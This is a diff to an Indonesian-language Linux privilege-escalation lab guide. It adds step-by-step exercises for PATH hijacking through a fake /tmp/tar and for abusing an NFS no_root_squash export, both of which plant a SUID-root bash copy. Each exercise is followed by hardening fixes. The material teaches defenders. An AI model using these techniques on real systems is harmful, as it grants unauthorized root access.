@@ -338,7 +338,13 @@ Batasi pula akses jaringan ke port **111/2049** lewat firewall ke subnet managem
 
 ## Lab Praktik
 
-**Topologi:** satu host Linux lab (`target`, Ubuntu 22.04/24.04) dengan akun `lowpriv` (user biasa) dan akses root untuk hardening. Semua latihan dilakukan di VM/lab terisolasi.
+**Topologi:** satu host Linux lab (`target`, Ubuntu 22.04/24.04) dengan akun `lowpriv` (user biasa) dan akses root untuk hardening. Lab 1–5 cukup host tunggal ini; **Lab 6 (NFS) membutuhkan host kedua** (`attacker`) di subnet yang sama. Semua latihan dilakukan di VM/lab terisolasi.
+
+**Prasyarat (sekali saja, sebagai root):** buat akun uji `lowpriv` bila belum ada:
+```bash
+sudo useradd -m -s /bin/bash lowpriv && sudo passwd lowpriv
+```
+Buka satu shell tambahan sebagai `lowpriv` (mis. `sudo su - lowpriv` atau SSH terpisah) untuk menjalankan langkah ber-label **`lowpriv`**.
 
 ### Lab 1 — SUID abuse lalu tutup
 
@@ -360,9 +366,32 @@ Batasi pula akses jaringan ke port **111/2049** lewat firewall ke subnet managem
 
 ### Lab 4 — PATH hijack
 
-1. Buat script root `/usr/local/sbin/runjob` yang memanggil `tar` secara relatif; pastikan `/tmp` (writable) ada di depan PATH konteks itu (mis. `PATH=/tmp:$PATH runjob`).
-2. **Lakukan (`lowpriv`):** taruh `/tmp/tar` berisi `#!/bin/sh` + payload, `chmod +x /tmp/tar` → saat `runjob` jalan sebagai root, `/tmp/tar` dieksekusi.
-3. **Hardening:** ganti panggilan jadi `/usr/bin/tar` (absolut) dan set PATH eksplisit di awal script. **Konfirmasi:** `tar` jahat di `/tmp` tidak lagi dipanggil.
+1. Sebagai root, buat script privileged yang **rentan** — PATH menaruh `/tmp` (writable) di depan dan memanggil `tar` secara relatif (mensimulasikan job/utility yang dijalankan root):
+   ```bash
+   sudo tee /usr/local/sbin/runjob >/dev/null <<'EOF'
+   #!/bin/sh
+   export PATH=/tmp:/usr/bin:/bin     # MISCONFIG: dir writable user di depan PATH
+   tar --version >/dev/null           # panggilan relatif → bisa dibajak
+   echo "runjob selesai sebagai $(id -un)"
+   EOF
+   sudo chmod 755 /usr/local/sbin/runjob
+   ```
+2. **Lakukan (`lowpriv`):** tanam `tar` palsu di `/tmp` yang lebih dulu ditemukan PATH:
+   ```bash
+   cat > /tmp/tar <<'EOF'
+   #!/bin/sh
+   cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash
+   EOF
+   chmod +x /tmp/tar
+   ```
+3. Sebagai root (mensimulasikan eksekusi terjadwal), jalankan script: `sudo /usr/local/sbin/runjob`. **Konfirmasi (`lowpriv`):** `/tmp/rootbash -p` → root shell (`id` → `euid=0`), karena `/tmp/tar` dieksekusi sebagai root.
+4. **Hardening:** ubah script agar memakai path absolut dan PATH aman:
+   ```bash
+   sudo sed -i 's#^export PATH=.*#export PATH=/usr/sbin:/usr/bin:/sbin:/bin#' /usr/local/sbin/runjob
+   sudo sed -i 's#^tar --version#/usr/bin/tar --version#'                      /usr/local/sbin/runjob
+   sudo rm -f /tmp/rootbash
+   ```
+   **Konfirmasi dengan:** ulangi langkah 2–3 → `/usr/bin/tar` (asli) yang dipanggil, `/tmp/tar` diabaikan, `/tmp/rootbash` **tidak** terbentuk.
 
 ### Lab 5 — Cron wildcard injection (tar)
 
@@ -379,16 +408,37 @@ Batasi pula akses jaringan ke port **111/2049** lewat firewall ke subnet managem
 
 ### Lab 6 — NFS `no_root_squash` privesc lalu tutup
 
-1. Root di `server` (10.10.0.10): `mkdir -p /srv/share`, tulis `/etc/exports` berisi `**/srv/share *(rw,no_root_squash,sync,no_subtree_check)**` (misconfig sengaja), lalu `exportfs -ra`.
-2. **Lakukan (dari `attacker` yang sudah punya root):**
+**Prasyarat:** dua host — `server` (`10.10.0.10`) dan `attacker` (punya root, subnet sama). Pasang paket:
+```bash
+# di server:
+sudo apt install -y nfs-kernel-server          # RHEL: sudo dnf install -y nfs-utils
+# di attacker:
+sudo apt install -y nfs-common                 # menyediakan 'mount.nfs' & 'showmount'
+```
+
+1. Sebagai root di `server`, buat share + ekspor yang **sengaja rentan**, lalu aktifkan:
    ```bash
-   showmount -e 10.10.0.10                 # lihat /srv/share diekspor ke *
-   mkdir -p /mnt/nfs && mount -t nfs 10.10.0.10:/srv/share /mnt/nfs
-   cp /bin/bash /mnt/nfs/rootbash          # ditulis sebagai root → di server pun milik root
-   chown root:root /mnt/nfs/rootbash && chmod 4755 /mnt/nfs/rootbash
+   sudo mkdir -p /srv/share
+   echo '/srv/share *(rw,no_root_squash,sync,no_subtree_check)' | sudo tee /etc/exports
+   sudo exportfs -ra
+   sudo systemctl restart nfs-kernel-server     # RHEL: nfs-server
    ```
-   Di `server`/host korban, user biasa menjalankan `/srv/share/rootbash -p` → `euid=0` (root).
-3. **Hardening:** ganti ekspor menjadi `/srv/share 10.10.0.0/24(ro,root_squash,sync,no_subtree_check)` lalu `exportfs -ra`; mount client `-o nosuid,nodev`. **Konfirmasi dengan:** `exportfs -v` tidak menampilkan `no_root_squash`; ulangi langkah 2 → file SUID root tak bisa lagi dibuat (UID 0 di-squash ke `nobody`), dan andai ada SUID lama, `nosuid` membuatnya jalan tanpa hak root.
+2. **Lakukan (dari `attacker`, sebagai root):**
+   ```bash
+   showmount -e 10.10.0.10                 # → /srv/share diekspor ke *
+   sudo mkdir -p /mnt/nfs && sudo mount -t nfs 10.10.0.10:/srv/share /mnt/nfs
+   sudo cp /bin/bash /mnt/nfs/rootbash     # ditulis sebagai root → di server pun milik root
+   sudo chown root:root /mnt/nfs/rootbash && sudo chmod 4755 /mnt/nfs/rootbash
+   ```
+   Di `server`, user biasa (`lowpriv`) menjalankan `/srv/share/rootbash -p` → `euid=0` (root).
+3. **Hardening (di `server`):** persempit ekspor jadi `root_squash` + dibatasi subnet, lalu re-export:
+   ```bash
+   echo '/srv/share 10.10.0.0/24(ro,root_squash,sync,no_subtree_check)' | sudo tee /etc/exports
+   sudo exportfs -ra
+   sudo exportfs -v                        # → TIDAK ada 'no_root_squash'
+   ```
+   Di `attacker`, remount dengan `nosuid,nodev`: `sudo umount /mnt/nfs; sudo mount -t nfs -o ro,nosuid,nodev 10.10.0.10:/srv/share /mnt/nfs`.
+   **Konfirmasi dengan:** ulangi langkah 2 → file SUID root tak bisa lagi dibuat (UID 0 di-squash ke `nobody`), dan andai ada SUID lama, `nosuid` membuatnya jalan tanpa hak root.
 
 ---
 
